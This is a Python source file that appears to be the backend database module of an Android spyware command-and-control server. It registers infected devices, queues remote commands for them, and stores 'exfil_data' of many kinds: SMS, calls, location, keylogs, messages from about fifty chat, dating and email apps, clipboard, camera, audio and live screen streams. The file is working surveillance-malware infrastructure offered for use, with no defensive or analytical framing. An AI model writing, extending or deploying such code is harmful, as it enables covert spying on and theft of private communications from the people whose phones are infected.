import sqlite3
import os
import json
from datetime import datetime

DB_PATH = os.environ.get("DB_PATH", "smilex.db")

# All known data types (for filtering in dashboard)
# Expanded to include all 50+ IM apps from IMReaderModule
DATA_TYPES = [
    # Core data types
    "sms", "call", "location", "contact", "notification",
    "accessibility", "keylog",
    # IM / Messaging apps
    "im", "im_whatsapp", "im_telegram", "im_signal", "im_instagram",
    "im_facebook", "im_viber", "im_skype", "im_vk", "im_discord",
    "im_line", "im_kakaotalk", "im_bbm", "im_wechat", "im_weibo",
    "im_snapchat", "im_tinder", "im_tumblr", "im_twitter", "im_tiktok",
    "im_reddit", "im_textme", "im_kik", "im_threema", "im_zalo",
    "im_muzmatch", "im_imo", "im_wamba", "im_waplog", "im_boo",
    "im_mamba", "im_gostinder", "im_okru", "im_oneme", "im_skylove",
    "im_hangouts", "im_gmail", "im_outlook", "im_bluemail", "im_yandexmail",
    "im_deepseek", "im_chatgpt", "im_grok", "im_perplexity", "im_scaleup",
    "im_alice", "im_teams", "im_meet", "im_googlechat",
    # Calendar & Browser
    "calendar", "browser_history", "browser_url",
    # Device & System
    "app_usage", "app_install", "device_info", "files", "clipboard",
    "screencap", "screenshot", "camera", "audio", "livestream",
    "battery", "sim", "network",
]

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            model TEXT,
            android_version TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS exfil_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            data_type TEXT NOT NULL,
            payload TEXT,
            filename TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            cmd TEXT NOT NULL,
            args TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS livestream (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            frame_data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_exfil_device ON exfil_data(device_id);
        CREATE INDEX IF NOT EXISTS idx_exfil_type ON exfil_data(data_type);
        CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id);
        CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
    """)
    conn.commit()
    conn.close()

def register_device(device_id, model=None, android_version=None):
    conn = get_db()
    c = conn.cursor()
    c.execute("""
        INSERT INTO devices (device_id, model, android_version)
        VALUES (?, ?, ?)
        ON CONFLICT(device_id) DO UPDATE SET
            last_seen=CURRENT_TIMESTAMP,
            model=COALESCE(excluded.model, model),
            android_version=COALESCE(excluded.android_version, android_version)
    """, (device_id, model, android_version))
    conn.commit()
    conn.close()

def store_exfil(device_id, data_type, payload=None, filename=None):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "INSERT INTO exfil_data (device_id, data_type, payload, filename) VALUES (?, ?, ?, ?)",
        (device_id, data_type, payload, filename)
    )
    conn.commit()
    conn.close()

def queue_command(device_id, cmd, args=None):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO commands (device_id, cmd, args) VALUES (?, ?, ?)",
              (device_id, cmd, args))
    conn.commit()
    conn.close()

def get_pending_commands(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT * FROM commands WHERE device_id=? AND status='pending' ORDER BY created_at ASC",
        (device_id,)
    )
    rows = c.fetchall()
    for row in rows:
        c.execute(
            "UPDATE commands SET status='sent', executed_at=CURRENT_TIMESTAMP WHERE id=?",
            (row['id'],)
        )
    conn.commit()
    result = [dict(r) for r in rows]
    conn.close()
    return result

def get_devices():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    result = [dict(r) for r in c.fetchall()]
    conn.close()
    return result

def get_exfil_data(device_id=None, data_type=None, limit=100):
    conn = get_db()
    c = conn.cursor()
    query = "SELECT * FROM exfil_data WHERE 1=1"
    params = []
    if device_id:
        query += " AND device_id=?"
        params.append(device_id)
    if data_type:
        query += " AND data_type=?"
        params.append(data_type)
    query += " ORDER BY created_at DESC LIMIT ?"
    params.append(limit)
    c.execute(query, params)
    result = [dict(r) for r in c.fetchall()]
    conn.close()
    return result

def get_exfil_by_types(device_id, types, limit=50):
    """Get exfil data filtered to a list of data_types."""
    conn = get_db()
    c = conn.cursor()
    placeholders = ",".join("?" * len(types))
    query = (
        f"SELECT * FROM exfil_data WHERE device_id=? AND data_type IN ({placeholders})"
        f" ORDER BY created_at DESC LIMIT ?"
    )
    c.execute(query, [device_id] + list(types) + [limit])
    result = [dict(r) for r in c.fetchall()]
    conn.close()
    return result

def get_all_commands(device_id=None, limit=100):
    conn = get_db()
    c = conn.cursor()
    query = "SELECT * FROM commands WHERE 1=1"
    params = []
    if device_id:
        query += " AND device_id=?"
        params.append(device_id)
    query += " ORDER BY created_at DESC LIMIT ?"
    params.append(limit)
    c.execute(query, params)
    result = [dict(r) for r in c.fetchall()]
    conn.close()
    return result

def get_stats():
    conn = get_db()
    c = conn.cursor()
    stats = {}
    c.execute("SELECT COUNT(*) FROM devices")
    stats['total_devices'] = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM exfil_data")
    stats['total_exfil'] = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM commands")
    stats['total_commands'] = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
    stats['pending_commands'] = c.fetchone()[0]
    # Per-type counts
    c.execute(
        "SELECT data_type, COUNT(*) as cnt FROM exfil_data GROUP BY data_type ORDER BY cnt DESC"
    )
    stats['type_counts'] = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    return stats

def delete_exfil(record_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM exfil_data WHERE id=?", (record_id,))
    conn.commit()
    conn.close()

def delete_all_exfil_for_device(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM exfil_data WHERE device_id=?", (device_id,))
    conn.commit()
    conn.close()
